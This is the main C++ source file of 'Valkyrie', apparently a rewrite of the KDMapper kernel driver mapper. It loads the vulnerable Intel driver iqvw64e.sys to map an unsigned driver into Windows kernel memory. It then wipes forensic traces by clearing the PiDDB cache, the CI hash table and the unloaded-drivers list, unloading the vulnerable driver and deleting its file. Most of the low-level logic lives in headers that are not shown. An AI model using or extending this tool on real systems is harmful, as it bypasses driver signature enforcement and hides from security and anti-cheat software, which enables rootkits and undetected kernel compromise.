// Code by Cyril "Parad0x141" Bouvier - 2026  Valkyrie v0.4.2


// Valkyrie is a clean and complete rewrite of KDMapper by TheCruz
// with added stealth features & various code/features improvements by Parad0x141

// Original KDMapper repo -> https://github.com/TheCruZ/kdmapper Many thanks to TheCruz for sharing his work <3


#include "Common.hpp"
#include "Helpers.hpp"
#include "Args.hpp"
#include "PEUtils.hpp"
#include "ValkyrieMapper.hpp"
#include "StealthKit.hpp"
#include "Init.hpp"
#include "Resolver.hpp"
#include "XorLog.hpp"
#include "EnvProbe.hpp"




extern "C" {
	void __asan_init(); // To ensure address sanitizer is running
}


static void MapDriver(IntelLoader& loader, StealthKit& stealthKit, ValkyrieMapper& mapper, Args& args)
{
	// Intel driver timestamp
	ULONG timestamp = GetPETimeStamp(loader.GetDriverPath());

	// User driver path
	std::string narrowedPath = WStringToString(args.driverPath);


	// Load and validate.
	auto pe = PEUtils::ParsePE(narrowedPath);

	if (!pe || !PEUtils::ValidateDriverPE(*pe))
		return;
	

	// Optionnaly show PE metas
	if(args.showDriverInfo)
		PEUtils::ShowPEDetails(*pe,args.DriverName());  

	// Clean if user abort operations.

	system("cls");
	LOG_INFO("Loading -> : " << args.DriverName());
	JumpLine();
	if (!ConfirmYesNo(L"Do you really want to load this driver ?"))
	{

		system("cls");
		LOG_WARNING("Mapping aborted by user. Cleaning Intel driver traces...");
		JumpLine();

		ValkStatus status = stealthKit.CleanPiDDBCache(L"iqvw64e.sys", timestamp);
		status = stealthKit.ClearCIHashTable();

		stealthKit.ClearMmUnloadedDrivers();
		loader.UnloadVulnDriver();

		DeleteDriverFile();

		LOG_SUCCESS(L"All operations completed. Press Enter to exit. Farewell !");
		std::wcin.ignore();

		return;
	}


	system("cls");
	LOG_INFO("Mapping driver...");
	JumpLine();

	NTSTATUS exitCode = 0;
	
	ULONG64 mappedBase = mapper.MapDriver(
		*pe,
		0, 0, args.freeMemory, args.noHeaderScramble,
		AllocationMode::AllocateIndependentPages,
		false,&exitCode);

	JumpLine();
	LOG_SUCCESS_HEX("Driver mapped ! Driver entry called, returned : ", exitCode);
	JumpLine();

	// Only show the base address if it's not a one-shot driver.
	if(!args.freeMemory)
		LOG_SUCCESS_HEX("Base address of mapped driver : ", mappedBase);
	if (args.freeMemory)
		LOG_SUCCESS("Memory cleaned, driver unloaded !");

	JumpLine();
	LOG_INFO("Cleaning Intel driver traces...");
	JumpLine();

	// TODO : Encrypt all strings.
	ValkStatus status = stealthKit.CleanPiDDBCache(L"iqvw64e.sys", timestamp);
	status = stealthKit.ClearCIHashTable();

	stealthKit.ClearMmUnloadedDrivers();
	loader.UnloadVulnDriver();

	DeleteDriverFile();
	
	JumpLine();
	LOG_SUCCESS(L"All operations completed. Press Enter to exit. Farewell !");
	JumpLine();

	std::wcin.ignore();
	return;
}



// Entry point
int wmain(int argc, wchar_t* arvg[])
{
	XorLog::EnableANSI();

	Args args = ParseArgs(__argc, __wargv);


	if (args.help)
	{
		PrintHelp();
		return EXIT_SUCCESS;
	}


	Splash();
	JumpLine();
	std::cout << "Press Enter to continue..." << "\n";
	std::wcin.ignore();

	if (!IsAdmin())
	{
		LOG_ERROR("Valkyrie need to be launched as administrator.");
		std::wcin.ignore();

		return EXIT_FAILURE;
	}

	ValkStatus status = ValkStatus::OK;

	IntelLoader loader;
	loader.SetKernelBaseAddress();

	Resolver resolver(loader);
	ValkyrieMapper mapper(loader);
	

	if (!WriteDriverFile()) 	
		return EXIT_FAILURE;
	
	if (!loader.LoadVulnDriver())
	{
		DeleteDriverFile();
		return EXIT_FAILURE;
	}

	if (!loader.OpenDevice()) 
	{
		loader.UnloadVulnDriver();
		DeleteDriverFile();
		return EXIT_FAILURE;
	}


	resolver.ResolveExported();
	resolver.ResolvePatterns();

	if (!resolver.AllOffsetsResolved())
	{
		system("cls");
		LOG_ERROR("Failed to resolve at least one critical kernel offsets. Aborting.");
		std::wcin.ignore();
		return EXIT_FAILURE;
	}

	loader.SetOffsets(resolver.GetOffsets());
	StealthKit stealthKit(loader, resolver.GetOffsets());


	LOG_SUCCESS("All kernel offsets successfully resolved, mapper ready...");
	Sleep(3000); // TODO Add more and randomize 
	
	MapDriver(loader, stealthKit, mapper, args);

	return EXIT_SUCCESS;

} 



